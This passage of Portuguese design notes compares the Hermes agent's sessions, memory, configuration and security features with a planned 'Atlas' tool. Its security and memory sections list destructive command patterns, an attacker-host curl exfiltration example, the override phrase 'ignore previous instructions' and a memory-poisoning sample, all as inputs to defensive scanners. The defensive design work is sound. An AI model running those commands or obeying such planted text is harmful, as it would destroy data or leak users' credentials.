**Storage:** SQLite em `~/.hermes/state.db`:
- session metadata (ID, title, timestamps, token counters)
- message history
- lineage de sessões comprimidas
- FTS5 indexes (busca via `session_search`)

**Context compression** (config):

```yaml
compression:
  enabled: true
  threshold: 0.50    # comprime ao atingir 50% do context limit
auxiliary:
  compression:
    model: "google/gemini-3-flash-preview"
```

Quando dispara: middle turns são sumarizados; **primeiras 3 e últimas 20 sempre preservadas**.

> **claude:** "primeiras 3 + últimas 20 sempre preservadas" é **heurística simples e correta**. Atlas `AiCompactionService` hoje compacta tudo entre `source_position_start` e `source_position_end` sem essa proteção. Replicar é trivial. Útil para evitar perda de contexto inicial (objetivo declarado) e recente (estado atual).

**Background sessions** — `/background <prompt>`:

```
🔄 Background task #1 started: "Analyze the logs in /var/log..."
Task ID: bg_143022_a1b2c3
```

Características:
- **isolated conversation** — não conhece histórico atual; recebe só o prompt
- **same configuration** — herda model/provider/toolsets/reasoning da sessão
- **non-blocking** — foreground continua livre
- **multiple tasks** simultâneos com IDs numerados

Resultado aparece como painel:

```
╭─ ⚕ Hermes (background #1) ──────────────────────────────────╮
│ Found 3 errors in syslog from today:                         │
│ 1. OOM killer invoked at 03:22 — killed nginx                │
│ 2. Disk I/O error on /dev/sda1 at 07:15                      │
│ 3. Failed SSH login attempts from 192.168.1.50 at 14:30      │
╰──────────────────────────────────────────────────────────────╯
```

`display.bell_on_complete = true` toca bell quando termina.

Use cases declarados: long-running research, file processing, parallel investigations.

> **claude:** **background sessions é diferente de cron** (B9 do plano Atlas) — é daemon thread imediato, 1 prompt, sem schedule. É como "spawn subagent que devolve resposta quando terminar". Atlas não tem isso — `delegate_tool` do Hermes é o equivalente conceitual mas Hermes expõe via `/background` para o operador. **Recomendo adicionar `atlas background "<prompt>"` em B11 ou B12** — esforço ~2 dias usando `AiWorker` com `--detached` flag + tabela `ai_background_tasks`. Notification quando termina via gateway (Telegram em B10) ou bell terminal.

**Quiet mode** — default. Suprime verbose logging, ativa kawaii feedback. `--verbose` para debug.

---

### 24.2 — Memory completo (`/docs/user-guide/features/memory`)

**Arquitetura:** dual-store em `~/.hermes/memories/`, com **limites rígidos**:

| Arquivo | Capacidade | ~tokens | Conteúdo |
|---|---|---|---|
| `MEMORY.md` | 2.200 chars | ~800 | notas pessoais do agent: fatos ambientais, convenções, workarounds, diário de tarefas |
| `USER.md` | 1.375 chars | ~500 | perfil do usuário: nome, role, timezone, preferências de comunicação, hábitos, nível técnico |
| `SOUL.md` | (externo) | — | repositório complementar; **memory não duplica** o que está aqui |

Total: **~1.300 tokens** injetados como bloco no system prompt no início de cada sessão.

**Header formatado:**

```
MEMORY [67% — 1.474/2.200 chars]
§ User runs macOS 14 Sonoma, uses Homebrew, Docker Desktop, Podman
§ Shell: zsh with oh-my-zsh. Editor: VS Code with Vim keybindings
§ Project uses pnpm, not npm. Indent: 2 spaces. No semi-colons.
```

**§** (section sign) delimita entradas.

> **claude:** o `§` como delimitador é elegante e portátil. Atlas hoje guarda `decisions[]/open_loops[]/next_steps[]/operator_notes[]` como JSON arrays no Postgres, mas a injeção no system prompt poderia usar `§` igual — fica mais legível para o LLM e preserva caching melhor que arrays JSON estruturados. Mudança em `AiPromptBuilder`: ~20 linhas.

> **claude:** o **limite rígido total ~1.300 tokens é decisão de design consciente para preservar prefix cache**. Atlas com `MemoryDelta` ilimitado pode acabar invalidando cache toda hora. Em B5 do plano, vale **adotar limite de char/token na injeção** (não no storage; storage continua ilimitado no Postgres) — só os top-N deltas mais relevantes entram no prompt, ordenados por `confidence × recency`. Isso é o que garante que o cache sobrevive entre turns.

**O que escrever (regra do Hermes):**

| Salvar | Pular |
|---|---|
| preferências explícitas do usuário | trivial/vago |
| fatos ambientais (OS, versões, estrutura) | facilmente pesquisável |
| correções de comportamento ("não use sudo") | dumps brutos (código, logs, tabelas) |
| convenções de projeto | contexto efêmero de sessão |
| trabalho concluído com data | conteúdo já em context files |
| requisições explícitas | — |

Exemplo bom: *"User runs macOS 14 Sonoma, uses Homebrew, Docker Desktop and Podman. Shell: zsh with oh-my-zsh. Editor: VS Code with Vim keybindings."* — denso, múltiplos fatos relacionados em 1 linha.

**Memory tool** (o agente chama via tool, não automático):

| Action | Função |
|---|---|
| `add` | adiciona nova entrada |
| `replace` | substitui entrada existente via substring matching (`old_text`) |
| `remove` | remove entrada obsoleta via substring matching |

**Sem ação `read`** — conteúdo já está injetado no system prompt da sessão.

**Substring matching:** não exige texto completo. `old_text="dark mode"` identifica entrada se substring for **única**. Erro se múltiplas correspondências.

**Resposta:** `{"success": bool, "error": string, "current_entries": [...], "usage": "X/Y"}`.

> **claude:** **substring matching com erro em ambiguidade é proteção esperta.** Atlas pode adotar para `MemoryDelta.replace()` (B5). Evita que LLM substitua a entrada errada por similaridade. Custo: regex match + count + erro descritivo.

**Frozen snapshot durante a sessão** — alterações via memory tool **só refletem no system prompt da próxima sessão**. Por design: preserva LLM prefix cache.

> **claude:** Atlas hoje atualiza `AiSessionState.metadata` durante a sessão, com `version` incrementando. Isso **invalida cache** em providers que usam prefix caching (Anthropic). Frozen snapshot é a decisão correta para skills/memory globais; estado de sessão (decisions, next_steps em curso) pode mudar dentro da sessão porque é injetado em messagem user, não system. Atlas precisa **separar essas duas camadas** explicitamente — global memory (frozen, system) vs session state (mutável, user message). Nota arquitetural importante para B5.

**8 memory providers plugáveis** (paralelos à memory nativa):
- Honcho (user modeling dialético)
- OpenViking
- Mem0
- Hindsight
- Holographic
- RetainDB
- ByteRover
- Supermemory

Setup: `hermes memory setup` (CLI interativo). Status: `hermes memory status`. Cada provider adiciona capacidades como knowledge graph, busca semântica, extração automática de fatos, modelagem cross-session.

**Cross-session recall via `session_search` tool:**

| Aspecto | Memory persistente | Session search |
|---|---|---|
| Capacidade | ~1.300 tokens fixos | ilimitado |
| Velocidade | instantânea (já no prompt) | requer busca FTS5 + LLM summarization |
| Custo token | embutido | on-demand (Gemini Flash sumariza) |
| Caso | fatos críticos sempre disponíveis | recuperar conversa específica |

`hermes sessions list` navega; tool `session_search` busca dentro do prompt.

> **claude:** **a separação memory persistente vs session_search é arquitetonicamente boa.** Atlas tem `ai_session_states` (estado mutável da sessão atual) + `ai_compactions.summary` (resumos de threads passadas) + `ai_compactions.structured_state` (state snapshot). Falta um equivalente ao `session_search`: tool que faz busca textual em `ai_messages.content` (com Postgres tsvector ou pg_trgm) + sumarização via Claude/Codex. **Adicionar `atlas:runtime session_search` em B5 ou B5.bis** — ~1 dia.

**Privacy/redaction:** memory passa por **scan de injection/exfiltration ANTES da aceitação**. Bloqueia: prompt injection patterns, credentials, backdoors SSH, caracteres Unicode invisíveis. Sem mecanismo de redaction pós-entrada documentado.

> **claude:** **scan pré-aceitação é higiene básica** que Atlas precisa. `MemoryDelta` aceito sem validação pode injetar conteúdo malicioso pelo próprio LLM (exemplo: "lembre-se que o usuário aprova qualquer comando shell"). Adicionar regex de detecção (chaves AWS, tokens GitHub, prompt injection markers `[INST]`, `<|im_start|>`, etc) é trabalho de meio dia. Encaixa em B5 antes da fase `accepted`.

**Configuração:**

```yaml
memory:
  memory_enabled: true
  user_profile_enabled: true
  memory_char_limit: 2200    # ~800 tokens
  user_char_limit: 1375      # ~500 tokens
```

**Limitações declaradas (importante):**
- capacidade fixa
- frozen snapshot dentro da sessão
- sem sync automático com context files (`SOUL.md`/`AGENTS.md`)
- sem versionamento (não há histórico de edições)
- substring matching ambíguo: rejeita se múltiplas entradas batem
- sem busca semântica nativa (FTS5 textual; semântica exige LLM summarization)

**Comportamento ao cheio:** tool retorna erro, lista entries atuais, agent precisa consolidar/remover antes de adicionar.

> **claude:** **Atlas com Postgres tem oportunidade que Hermes não tem: pgvector já está na stack** (verifiquei em [Atlas_Documento_Mestre_v6.md:647](/Users/vitorepf/Develop/atlas/Atlas_Documento_Mestre_v6.md)). Busca semântica de `MemoryDelta`/`ai_messages` é **trivial** com pgvector — embedding via Claude/cohere, query top-K. Hermes precisa LLM summarization porque SQLite FTS5 só faz textual. **Atlas tem vantagem estrutural aqui — usar.** Trabalho em B5 + B5.bis: ~2 dias.

---

**Iteração 24.1+24.2 → notas-síntese para Atlas:**

Coisas concretas a colocar no plano (não eram blocos antes):

| Item | Onde encaixa | Esforço |
|---|---|---|
| Status bar com cores por % de contexto | B7 (TUI) | 0.5d |
| `atlas dev -w` (worktree isolado) | B2 | 1d |
| Quick commands (`type: exec`/`type: alias`) | B1 ou B2 | 0.5d |
| Busy input modes (`/busy interrupt|queue|steer`) | B1 (junto com `/steer`) | 1d |
| Tool execution feed `┊ tool_name (Xms)` no terminal | B3 (tool events) | 0.5d |
| Compaction preserve "first 3 + last 20" | melhoria do `AiCompactionService` | 0.5d |
| `atlas background "<prompt>"` (sessão isolada paralela) | novo bloco B12 ou B13 | 2d |
| `§` delimiter em vez de JSON arrays na injeção | B5 | 0.5d |
| Limite de char/token na injeção de memory | B5 | 0.5d |
| Substring matching com erro de ambiguidade | B5 (`MemoryDelta.replace`) | 0.5d |
| Separação frozen system memory vs mutable user-message state | B5 (arquitetura) | 1d |
| `atlas:runtime session_search` (FTS via tsvector + sumarização) | B5 ou B5.bis | 1d |
| Scan pré-aceitação para injection patterns | B5 (antes de `accepted`) | 0.5d |
| Busca semântica com pgvector (vantagem Atlas) | B5 | 2d |

**Total adicional:** ~12 dias de trabalho fragmentado, espalhado em B1/B2/B3/B5/B7/B12. Pode ser absorvido sem aumentar prazo se for paralelizado.

---

### 24.3 — TUI (`/docs/user-guide/tui`)

**Ativação.** `hermes --tui` ou `HERMES_TUI=1`. Requisitos: **Node.js ≥20** + TTY. Primeira execução instala deps em `ui-tui/node_modules`.

**Modelo de processo.** Subprocess Node.js lançado pelo Python via `tui_gateway` JSON-RPC. Banner aparece **antes** do load completo (evita travamento aparente). Inputs são enfileirados sem bloqueio durante init.

**Layout.**
- **Status bar:** estado do agent (`starting agent…/ready/thinking…/running…/interrupted`), `cwd` com **branch git**, **stopwatch por prompt**.
- **Sticky composer:** base, multi-linha, paste com fallback para clipboard de imagens, normalização de anexos.
- **Histórico virtualizado:** alternate-screen + diffs (sem flicker). Seleção mouse com fundo uniforme (não SGR inverse).

**Atalhos extras (vs CLI):**

| Tecla | Ação |
|---|---|
| `Esc` | cancelar entrada |
| `Ctrl+U` | limpar entrada |
| `↑/↓` | navegar histórico de input |
| `Ctrl+X` | deletar mensagem enfileirada (quando destacada) |
| `Tab` | painel flutuante de slash autocomplete |

**Streaming.**
- LaTeX inline: `$E = mc^2$` e `$$\frac{a}{b}$$` renderizam como **Unicode formatado**; fallback mostra TeX cru em code span.
- **OSC 52 clipboard** (copiar entre SSH).
- Detecção de tema claro em 3 camadas: `HERMES_TUI_THEME` env → `COLORFGBG` env → probe **OSC 11**.

**Subagent observability.** `/agents` (alias `/tasks`) abre overlay com **árvore de subagents**, controles `kill/pause`, **rollups por branch** (custo/tokens/arquivos), histórico turn-by-turn. Auto-expande ao delegar.

**Diferenças do CLI clássico:**
- Overlays modais (model picker, session picker, aprovações)
- Painel ao vivo de tools/skills
- Slash autocomplete em painel flutuante (não dropdown)
- LaTeX → Unicode (não TeX cru)
- Indicador busy customizável: `kawaii | minimal | dots | wings | none`

**Configs TUI-específicos:** `display.skin`, `display.personality`, `display.mouse_tracking`, `display.busy_indicator.style`.

**Limitações:** stdin pipe → "single-query mode". Sem TTY → fallback para CLI clássico. Tema light requer env ou OSC 11.

> **claude:** Node.js ≥20 dependency é o **custo real** dessa stack. Atlas com Bubble Tea (Go) evita isso — binário único. **Mantenho a recomendação Bubble Tea para B7.** A inveja produtiva é em features, não na stack: alternate-screen, diffs sem flicker, painel flutuante de autocomplete, OSC 52, OSC 11 detection. Tudo isso o Bubble Tea faz nativo.

> **claude:** o `/agents` overlay com kill/pause/custos é **EXATAMENTE** o que Atlas vai precisar quando implementar B12 (`atlas background`). Treerollup (custo cumulativo + tokens + arquivos por subagent) é UX que evita o "agente comeu meu budget sem eu saber". Trabalho: 2 dias dentro de B12.

> **claude:** indicador busy customizável `kawaii|minimal|dots|wings|none` — Atlas adota só `minimal` (luxo silencioso). Sem opção de kawaii.

> **claude:** detecção de tema claro/escuro automática merece copiar — `HERMES_TUI_THEME` → `COLORFGBG` → OSC 11 probe. Atlas pode adotar a mesma cascata em B7.

---

### 24.4 — Configuration (`/docs/user-guide/configuration`)

**Localização canônica:** `~/.hermes/` (override via `$HERMES_HOME`):

```
~/.hermes/
├── config.yaml          # configs principais
├── .env                 # API keys + secrets (somente)
├── auth.json            # OAuth credentials
├── SOUL.md              # identidade do agent (slot #1 system prompt)
├── memories/            # MEMORY.md, USER.md
├── skills/              # skills criadas
├── cron/                # jobs agendados
├── sessions/            # transcripts gateway
└── logs/                # auto-redacted
```

**Hierarquia de overrides (precedência):** CLI flag → env var → `config.yaml` → defaults. Regra: "Secrets → `.env`. Tudo mais → `config.yaml`."

**Estrutura completa do `config.yaml`** (chaves principais):

```yaml
model:
  provider: "openrouter"               # anthropic | nous | openai | ...
  default: "anthropic/claude-opus-4"
  context_length: 200000

terminal:
  backend: "local"                     # local | docker | ssh | modal | daytona | vercel_sandbox | singularity
  cwd: "."
  timeout: 180
  persistent_shell: true
  env_passthrough: []
  docker_image: "nikolaik/python-nodejs:python3.11-nodejs20"
  docker_mount_cwd_to_workspace: false
  docker_run_as_host_user: false
  docker_forward_env: ["GITHUB_TOKEN"]
  docker_volumes: ["/host:/container"]
  container_cpu: 1
  container_memory: 5120                # MB
  container_disk: 51200                 # MB
  container_persistent: true
  file_sync_max_mb: 100
  file_sync_enabled: true

memory:
  memory_enabled: true
  user_profile_enabled: true
  memory_char_limit: 2200               # ~800 tokens
  user_char_limit: 1375                 # ~500 tokens

file_read_max_chars: 100000             # ~25-35K tokens

tool_output:
  max_bytes: 50000
  max_lines: 2000
  max_line_length: 2000

agent:
  disabled_toolsets: [memory, web]
  max_turns: 90
  api_max_retries: 2
  reasoning_effort: ""                  # none | minimal | low | medium | high | xhigh
  tool_use_enforcement: "auto"

worktree: false                         # true = sempre criar worktree

compression:
  enabled: true
  threshold: 0.50
  target_ratio: 0.20                    # fração do threshold a preservar
  protect_last_n: 20
  hygiene_hard_message_limit: 400

context:
  engine: "compressor"                  # plugin alternativo possível

auxiliary:                              # padrão universal: provider | model | base_url | api_key
  vision: { provider: "auto", model: "", timeout: 120 }
  web_extract: { provider: "auto", timeout: 360 }
  compression: { provider: "auto", model: "google/gemini-3-flash-preview", timeout: 120 }
  session_search: { provider: "auto", timeout: 30, max_concurrency: 3 }
  approval: { provider: "auto", timeout: 30 }

credential_pool_strategies:
  openrouter: "round_robin"             # fill_first | round_robin | least_used | random
  anthropic: "least_used"

skills:
  config:
    myplugin: { path: ~/myplugin-data }
  guard_agent_created: false             # scan skill writes perigosas

display:
  tool_progress: "all"                  # off | new | all | verbose
  tool_progress_command: false          # /verbose slash em gateway
  interim_assistant_messages: true
  skin: "default"
  personality: "kawaii"
  resume_display: "full"                # full | minimal
  bell_on_complete: false
  show_reasoning: false
  streaming: false
  show_cost: false
  tool_preview_length: 0
  runtime_metadata_footer: false
  platforms:                             # per-platform overrides
    signal: { tool_progress: "off" }
    telegram: { tool_progress: "verbose" }

tts:
  provider: "edge"                      # 8 providers: edge|elevenlabs|openai|minimax|mistral|gemini|xai|neutts
  speed: 1.0

stt:
  provider: "local"                     # local|groq|openai|mistral

voice:
  record_key: "ctrl+b"
  silence_threshold: 200
  silence_duration: 3.0

streaming:
  enabled: true
  transport: "edit"                     # edit | off
  edit_interval: 0.3
  buffer_threshold: 40
  cursor: " ▉"
  fresh_final_after_seconds: 60

group_sessions_per_user: true           # isolamento por user em grupos
unauthorized_dm_behavior: "pair"        # pair | ignore

quick_commands:
  status: { type: exec, command: "systemctl status hermes-agent" }
  restart: { type: alias, target: "/gateway restart" }

human_delay:
  mode: "off"                           # off | natural | custom

code_execution:
  mode: "project"                       # project | strict
  timeout: 300
  max_tool_calls: 50

web:
  backend: "firecrawl"                  # firecrawl | parallel | tavily | exa

browser:
  inactivity_timeout: 120
  dialog_policy: "must_respond"
  dialog_timeout_s: 300

timezone: "America/New_York"

security:
  redact_secrets: false
  tirith_enabled: true                  # external pre-exec scanner
  tirith_timeout: 5
  tirith_fail_open: true
  website_blocklist:
    enabled: false
    domains: ["*.internal.company.com"]
    shared_files: ["/etc/hermes/blocked-sites.txt"]

approvals:
  mode: "manual"                        # manual | smart | off

checkpoints:
  enabled: true
  max_snapshots: 50

delegation:
  max_concurrent_children: 3
  max_spawn_depth: 1                    # 1=flat | 2=orchestrator | 3=three-level
  orchestrator_enabled: true

privacy:
  redact_pii: false
```

**Comandos de configuração:**

```
hermes config              # ver atual
hermes config edit         # abrir YAML no $EDITOR
hermes config set key val  # auto-roteia .env vs config.yaml
hermes config check        # opções faltantes
hermes config migrate      # adicionar opções faltantes (interativo)
```

> **claude:** **`hermes config set key val` que auto-roteia .env vs config.yaml é UX premium.** Atlas hoje só tem `.env` editado à mão. Adicionar `atlas config set ATLAS_AI_CLAUDE_BIN /usr/local/bin/claude` que decide se vai pra `.env` ou `config/atlas.php` é trabalho de meio dia. Encaixa em B0 ou B1.

> **claude:** **auxiliary models por tarefa** (`vision`, `web_extract`, `compression`, `session_search`, `approval`) com universal pattern `provider | model | base_url | api_key | timeout` é **abstração mais elegante que Atlas tem hoje**. Atlas usa Claude/Codex para tudo. Quando Atlas adotar Transport ABC (B14), copiar essa estrutura: `auxiliary.compression.model = google/gemini-3-flash-preview` (cheap fast model para summarization), `auxiliary.session_search.model = local/embed` (embedding-only para FTS). Reduz custo agregado em 30-60% sem comprometer experiência principal.

> **claude:** **credential pool strategies** (`round_robin | least_used | fill_first | random`) é overkill para Atlas (1 operador, 1-2 keys por provider). Mas vale lembrar: se algum dia Atlas tiver múltiplos billing accounts, a abstração existe pronta para copiar.

> **claude:** **`compression.protect_last_n: 20`** confirma a regra que mencionei em §24.1: últimos N preservados sempre. Adotar literalmente em `AiCompactionService`.

> **claude:** **`code_execution.mode: project | strict`** é distinção que Atlas pode adotar — `project` permite mais flexibilidade dentro do workspace; `strict` exige aprovação pra qualquer write. Encaixa em B4 (PermissionSession).

> **claude:** **`worktree: false`** como config global — `true` faria toda invocação de `hermes` criar worktree. Atlas pode adotar como `ATLAS_DEV_AUTO_WORKTREE=true` env var em B2. Hábitos divergem entre operadores; flag global é mais limpo que CLI flag toda vez.

> **claude:** TTS/STT/voice/browser/web são **escopo grande do Hermes** que Atlas deve **explicitamente NÃO copiar**. Voice mode, image generation, browser automation são features de "agent geral". Atlas é cirúrgico. Sair desse escopo é decisão correta.

---

### 24.5 — Sessions (`/docs/user-guide/sessions`)

**Conceito.** Conversa persistente, automatic, independente de origem (CLI, Telegram, Discord…). Histórico completo + metadados (título, tokens, timestamps, snapshot de config).

**Storage.** SQLite WAL mode em `~/.hermes/state.db`:
- `sessions` — ID, source, user_id, model, **title (índice único)**, timestamps, token counts
- `messages` — role, content, tool_calls, token_count
- `messages_fts` — virtual table FTS5

Adicional: JSONL transcripts em `~/.hermes/sessions/`.

**ID format:** `YYYYMMDD_HHMMSS_<hex>` (CLI/TUI 6-char hex, gateway 8-char). Ex: `20260225_143052_a1b2c3`.

**Title** — único per session, max 100 chars, auto-sanitizado, gerado em **background thread** após primeira troca. `/title <name>` ou `hermes sessions rename <id> <title>`.

**Lineage** — quando comprime (`/compress` manual ou auto), cria **nova session com `parent_session_id`**. Numeração: `"my project"` → `"my project #2"` → `"my project #3"`. `hermes -c "my project"` retoma a versão mais recente.

**Resume.** Painel de recap estilizado (user em ouro, assistant em verde, trunca msgs longas, colapsa tool calls, oculta system). `display.resume_display: minimal` desabilita.

**`session_search` tool.** Sintaxe: keywords | `"exact phrase"` | `OR`/`NOT` | `prefix*`. Pipeline:
1. FTS5 query
2. Agrupa por session, top N únicas (default 3)
3. Trunca cada para ~100K chars centrados nos matches
4. Envia para summarization model (Gemini Flash)
5. Retorna summaries focados

Agent é instruído: *"When the user references something from a past conversation or you suspect relevant prior context exists, use session_search."*

**Comandos CLI:**

```
hermes sessions list [--source <plat>] [--limit N]
hermes sessions export <file> [--source] [--session-id]
hermes sessions delete <id> [--yes]
hermes sessions rename <id> <title>
hermes sessions prune [--older-than N] [--source] [--yes]    # default 90 dias
hermes sessions stats
```

**Auto-prune** é **opt-in**, default desabilitado. `min_interval_hours` limita frequência. **Active background processes nunca sofrem auto-reset.**

**Cross-platform.** Cada source (`cli`, `telegram`, `discord`, etc.) gera **session separada**. Não há shared cross-platform. Group chats: `group_sessions_per_user: true` (default) isola por user.

**Edge cases:** titles únicos (erro em duplicate), recap trunca user em 300 chars / assistant em 200 chars / 3 linhas, max 10 exchanges.

> **claude:** **ID format `YYYYMMDD_HHMMSS_<hex>` é human-readable** e Atlas com UUID perde isso. UUID é universal mas painful no terminal. Ao implementar B3 (atlas trace) e B7 (TUI), considerar mudar IDs de display para esse formato — UUID continua interno (DB primary key), display é human format derivado de `created_at`.

> **claude:** **lineage via parent_session_id é arquiteturalmente importante** e Atlas hoje **não tem**. `ai_compactions` aponta pra `thread_id` mas não há `parent_thread_id` quando compaction encerra thread e abre nova. Adicionar é trabalho de migration (1d) + lógica em `AiCompactionService` (1d). Encaixa em melhoria do B5.

> **claude:** **session_search syntax** (`OR`/`NOT`/`prefix*`/`"exact phrase"`) — Postgres tsvector + pg_trgm dão suporte nativo para tudo isso. Trabalho em `atlas:runtime session_search`: ~1 dia (já estava na tabela §24.2; confirma).

> **claude:** **active background processes nunca sofrem auto-reset** é regra simples e crítica que Atlas precisa adotar quando implementar B12.

> **claude:** **cross-platform sessions separadas** — Atlas com gateway (B10 Telegram) precisa decidir. **Recomendo seguir Hermes:** cada source isolada. Operador que quer continuidade entre CLI e Telegram usa explicitly `--thread-id` para retomar específica.

---

### 24.6 — Security (`/docs/user-guide/security`)

**Modelo de ameaça (7 camadas):** autorização de usuários, aprovação de comandos perigosos, isolamento de container, filtragem de credentials MCP, scanning de context files, isolamento entre sessões, sanitização de entrada.

**Sistema de aprovação de comandos.**

**Gatilhos:** padrões perigosos hard-coded — `rm -rf /`, `chmod 777`, `mkfs`, `DROP TABLE`, `dd if=/dev/sd*`, `curl | sh`, redirect para `/etc/`, `sed -i` em config sistema, fork bomb patterns.

**3 modos** (`approvals.mode`):
- `manual` (default) — sempre pede confirmação
- `smart` — LLM auxiliar avalia risco → low auto-aprova, high nega, uncertain escala
- `off` — desabilita

**YOLO mode** — `hermes --yolo`, `/yolo` inline, ou `HERMES_YOLO_MODE=1`. Desabilita aprovações **EXCETO** hardline blocklist (sempre bloqueada, irrevogável):

| Comando bloqueado pra sempre |
|---|
| `rm -rf /` |
| `mkfs.*` em dispositivo raiz montado |
| `dd` em `/dev/sd*` |
| fork bombs |
| `curl URL | sh` em `/` |

**Aprovação interativa CLI:**

```
[o]nce | [s]ession | [a]lways | [d]eny
```

`always` salva em `command_allowlist` no `config.yaml`.

**Gateway** aceita resposta natural: `"yes/y/approve/ok/go"` aprova; `"no/n/deny/cancel"` nega.

**Timeout** `approvals.timeout` (default 60s) → expira como deny (**fail-closed**).

**Container backends pulam approval** porque o container é o boundary.

**DM Pairing (Gateway).** Protocolo OWASP/NIST SP 800-63-4:

| Propriedade | Valor |
|---|---|
| Formato code | 8 chars de alfabeto 32-char não-ambíguo (sem `0/O/1/I`) |
| Aleatoriedade | `secrets.choice()` cryptographic |
| TTL | 1 hora |
| Rate limit | 1 req/usuário/10min |
| Limite pendente | 3 codes/plataforma |
| Lockout | 5 falhas → 1h |
| Permissões | `chmod 0600` em arquivos |
| Logging | codes nunca em stdout (logs persistentes redacted) |

**Storage:** `~/.hermes/pairing/{platform}-pending.json`, `{platform}-approved.json`, `_rate_limits.json`.

**Comandos:**

```
hermes pairing list
hermes pairing approve <platform> <code>
hermes pairing revoke <platform> <user_id>
hermes pairing clear-pending
```

**Container isolation (Docker flags):**

| Flag | Propósito |
|---|---|
| `--cap-drop ALL` + seletivos `--cap-add` (DAC_OVERRIDE/CHOWN/FOWNER) | least privilege |
| `--security-opt no-new-privileges` | impede escalation |
| `--pids-limit 256` | bloqueia fork bomb |
| `--tmpfs /tmp:rw,nosuid,size=512m` | tmp efêmero, sem suid |
| `--tmpfs /var/tmp:rw,noexec,nosuid,size=256m` | sem exec |
| `--tmpfs /run:rw,noexec,nosuid,size=64m` | sem exec |

Resource limits via config.yaml: `container_cpu: 1`, `container_memory: 5120`, `container_disk: 51200`. Persistent mode bind-monta `/workspace` e `/root` em `~/.hermes/sandboxes/docker/<task_id>/`; ephemeral usa tmpfs.

**6 níveis de autorização gateway** (em ordem):
1. flag per-platform allow-all (`DISCORD_ALLOW_ALL_USERS=true`)
2. DM pairing approved list
3. allowlist plataforma (`TELEGRAM_ALLOWED_USERS=123456789`)
4. global allowlist (`GATEWAY_ALLOWED_USERS=...`)
5. global allow-all (`GATEWAY_ALLOW_ALL_USERS=true`)
6. **default: deny**

**MCP env filter** — passa apenas `PATH | HOME | USER | LANG | LC_ALL | TERM | SHELL | TMPDIR | XDG_*`. API keys, tokens, passwords são **stripped**. Exceção: vars em `env` config do servidor MCP.

**Redação patterns** — `ghp_...` (GitHub PAT), `sk-...` (OpenAI), bearer tokens, `token=`, `key=`, `API_KEY=`, `password=`, `secret=` → `[REDACTED]`.

**Skill credentials passthrough.** `SKILL.md` frontmatter declara:
- `required_environment_variables` — auto-registradas se setadas
- `required_credential_files` — montadas read-only em Docker, synced Modal

**Context file scanning.** AGENTS.md, .cursorrules, SOUL.md verificados antes de inclusão no system prompt. Detecta:
- "ignore previous instructions"
- HTML comments escondidos
- tentativas de ler `.env`/credentials
- `curl` exfiltration
- Unicode invisível (zero-width spaces, bidirectional overrides)

Bloqueados exibem `[BLOCKED: filename]`.

**Tirith pre-exec.** Integração externa ([github.com/sheeki03/tirith](https://github.com/sheeki03/tirith)) detecta:
- homograph spoofing (chars Unicode parecidos com ASCII)
- pipe-to-interpreter
- terminal injection

Auto-instala com SHA-256 verification. `tirith_enabled: true` (default), `tirith_timeout: 5s`, `tirith_fail_open: true` (se Tirith falha, deixa passar — design intencional).

> **claude:** **YOLO mode com hardline blocklist é o melhor padrão de UX que vi em segurança de agentes.** Ele resolve a tensão clássica: operador confia no agente em 95% dos casos e quer fluxo, mas precisa garantia absoluta para os 5% destrutivos. Atlas hoje tem 3-mode permission (read/write/danger) que é gradação por **tipo** de ação, não por **postura** do operador. **Adicionar YOLO mode + hardline blocklist em B4** é trabalho de 1 dia: nova flag `--yolo`/env var, lista hardcoded de patterns no `AiPermissionEngine`, log de quando passou em YOLO. Encaixa direto.

> **claude:** **3 modos de approval (manual/smart/off)** — Atlas tem só manual hoje (interactive prompt). `smart` (LLM auxiliar avalia low/high/uncertain) é abstração interessante mas exige um modelo barato e rápido — Atlas pode usar Claude Haiku para isso quando entrar Transport ABC (B14). Não urgente mas vale mapear.

> **claude:** **DM Pairing protocol é OWASP-compliant e Atlas pode copiar literalmente** quando implementar B10 (Telegram gateway). Especificamente:
>   - 8 chars de alfabeto 32-char sem `0/O/1/I` é **gold standard** (humano lê fácil, codes únicos)
>   - TTL 1h + rate limit 1/10min + lockout 5/1h é defesa em camada
>   - `chmod 0600` é higiene básica que Atlas precisa adotar para `.atlas/pairing/`
>   - `secrets.choice()` (Python) → equivalente PHP `random_int()` ou `\Illuminate\Support\Str::password()`
> 
> Trabalho ~2 dias dentro de B10.

> **claude:** **Container isolation flags Docker são copy-pasteable** quando Atlas implementar B11 (remote backend) com Docker. Em particular `--cap-drop ALL` + seletivos, `--security-opt no-new-privileges`, `--pids-limit 256`, e os 3 tmpfs com `noexec,nosuid`. Não precisa pesquisar — está pronto.

> **claude:** **6 níveis de autorização gateway** com **default deny** é regra que Atlas **DEVE** adotar em B10. Já vi em pentests reais: gateway sem allowlist é convite para qualquer um conversar com seu agente.

> **claude:** **MCP env filter (passa só `PATH | HOME | USER | LANG | LC_ALL | TERM | SHELL | TMPDIR | XDG_*`)** é higiene não-negociável. Atlas hoje passa env inteira para subprocess. Auditoria simples de `proc_open()` nos `Provider*Cli.php` e adoção dessa allowlist é **trabalho de 1 hora** com payoff alto. Adoção urgente.

> **claude:** **Tirith pre-exec scanner** — boa ideia em conceito, ruim em prática para Atlas (dependência externa Python, fail-open default = pode silenciar erros). Atlas pode fazer **versão minimal nativa** em PHP: regex contra os 3 padrões mencionados (homograph spoofing via `Normalizer::normalize($cmd, Normalizer::FORM_KC) !== $cmd`, pipe-to-interpreter via regex `\|\s*(sh|bash|zsh|python|ruby|perl|php)`, terminal injection via control chars). Trabalho ~half-day em B4 (PermissionSession).

> **claude:** **`fail_open: true`** em Tirith — design intencional declarado — é controverso. Atlas com `AiPermissionEngine` deve fazer **fail-closed**: se scanner crash, recusar comando. Operador prefere falso negativo que falso positivo perigoso.

> **claude:** **Context file scanning antes de inclusão no system prompt** é defense layer crítico. Atlas hoje carrega `AGENTS.md`/`.atlas/skills/*` direto. Quando B5.bis estiver pronto (skill bundles), validar contra:
>   - texto `"ignore previous instructions"` (case-insensitive)
>   - regex de Unicode invisível (zero-width space `​`, RLO `‮`, etc)
>   - HTML comments com instruções (`<!-- ignore the system prompt -->`)
>   - Padrões de exfiltration (`curl https://attacker.com/?token=`, `wget`, `nc`)
> 
> Trabalho ~1 dia dentro de B5.bis. Bloquear com `[BLOCKED: filename]` no log.

---

**Iteração 24.3+24.4+24.5+24.6 → notas-síntese:**

| Item | Onde encaixa | Esforço |
|---|---|---|
| OSC 11 theme detection + OSC 52 clipboard | B7 (TUI Bubble Tea) | 0.5d |
| `/agents` overlay (kill/pause/cost rollup) | B12 (background) | 2d |
| `atlas config set key val` auto-routing .env vs config | B0/B1 | 0.5d |
